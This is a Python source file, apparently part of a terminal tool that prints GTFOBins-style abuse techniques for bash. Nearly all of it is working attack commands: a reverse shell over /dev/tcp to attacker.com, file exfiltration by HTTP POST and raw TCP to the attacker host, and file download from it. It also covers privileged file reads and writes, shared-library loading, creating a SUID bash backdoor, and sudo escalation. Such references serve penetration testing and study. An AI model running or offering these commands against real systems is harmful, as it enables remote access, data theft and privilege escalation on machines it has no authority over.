from gbit.var import *

gtfobin = f"""
{SHELL}
{line}
{colored("It can be used to break out from restricted environments by spawning an interactive system shell.", 'blue')}
{colored("        bash", "green")}

{Reverse_shell}
{line}
{colored("It can send back a reverse shell to a listening attacker to open a remote network access.", 'blue')}
{colored("Run nc -l -p 12345 on the attacker box to receive the shell.", 'blue')}

{colored("        export RHOST=attacker.com", "green")}
{colored("        export RPORT=12345", "green")}
{colored("        bash -c 'exec bash -i &>/dev/tcp/$RHOST/$RPORT <&1'", "green")}

{File_upload}
{line}
{colored("It can exfiltrate files on the network.", 'blue')}
{colored("(a) Send local file in the body of an HTTP POST request. Run an HTTP service on the attacker box ", 'blue')}
{colored("    to collect the file.", 'blue')}
{colored("        export RHOST=attacker.com", "green")}
{colored("        export RPORT=12345", "green")}
{colored(f"        export LFILE={file_to_send}", "green")}
{colored(f"        bash -c 'echo -e 'POST / HTTP/0.9{chr(92)}n{chr(92)}n$(<$LFILE)' > /dev/tcp/$RHOST/$RPORT'", "green")}

{colored(f'''(b) Send local file using a TCP connection. Run nc -l -p 12345 > 'file_to_save' on the attacker box to''', 'blue')}
{colored("    collect the file.", 'blue')}
{colored("        export RHOST=attacker.com", "green")}
{colored("        export RPORT=12345", "green")}
{colored("        export LFILE=file_to_send", "green")}
{colored("        bash -c 'cat $LFILE > /dev/tcp/$RHOST/$RPORT'", "green")}

{File_download}
{line}
{colored(f'''(a) Fetch remote file using a TCP connection. Run nc -l -p 12345 < "file_to_send" on the attacker''', "blue")}
{colored("    box to send the file.", 'blue')}
{colored("        export RHOST=attacker.com", "green")}
{colored("        export RPORT=12345", "green")}
{colored(f"        export LFILE={file_to_get}", "green")}
{colored("        bash -c 'cat < /dev/tcp/$RHOST/$RPORT > $LFILE'", "green")}

{File_write}
{line}
{colored("It writes data to files, it may be used to do privileged writes or write files outside a restricted file", 'blue')}
{colored("system.", 'blue')}
{colored(f"(a) export LFILE={file_to_write}", "blue")}
{colored("        bash -c 'echo DATA > $LFILE'", "green")}
{colored("(b) This adds timestamps to the output file.", 'blue')}
{colored(f"        LFILE={file_to_write}", "green")}
{colored("        HISTIGNORE='history *'", "green")}
{colored("        history -c", "green")}
{colored("        DATA", "green")}
{colored("        history -w $LFILE", "green")}

{File_read}
{line}
{colored("It reads data from files, it may be used to do privileged reads or disclose files outside a restricted", 'blue')}
{colored("file system.", 'blue')}
{colored("(a) It trims trailing newlines and it’s not binary-safe.", 'blue')}
{colored(f"        export LFILE={file_to_read}", "green")}
{colored('''        bash -c 'echo "$(<$LFILE)"' ''', "green")}
{colored("(b) The read file content is surrounded by the current history content.", 'blue')}
{colored("        LFILE=file_to_read", "green")}
{colored(f"        HISTTIMEFORMAT=$'{chr(92)}r{chr(92)}e[K'", "green")}
{colored("        history -r $LFILE", "green")}
{colored("        history", "green")}

{Library_load}
{line}
{colored("It loads shared libraries that may be used to run code in the binary execution context.", 'blue')}
{colored("        bash -c 'enable -f ./lib.so x'", "green")}

{SUID}
{line}
{colored("If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to", 'blue')}
{colored("access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to", 'blue')}
{colored("run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh", 'blue')}
{colored("shell to run with SUID privileges.", 'blue')}

{colored("This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To", 'blue')}
{colored("interact with an existing SUID skip the first command and run the program using its original path", 'blue')}
{colored("        sudo install -m =xs $(which bash) .", "green")}
{colored("        ./bash -p", "green")}

{SUDO}
{line}
{colored("If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and", 'blue')}
{colored("may be used to access the file, escalate or maintain privileged access.", 'blue')}
{colored("        sudo bash", "green")}

{colored("cheers, wolf 🐺.", 'red', 'on_yellow', attrs=['bold', 'dark'])}
"""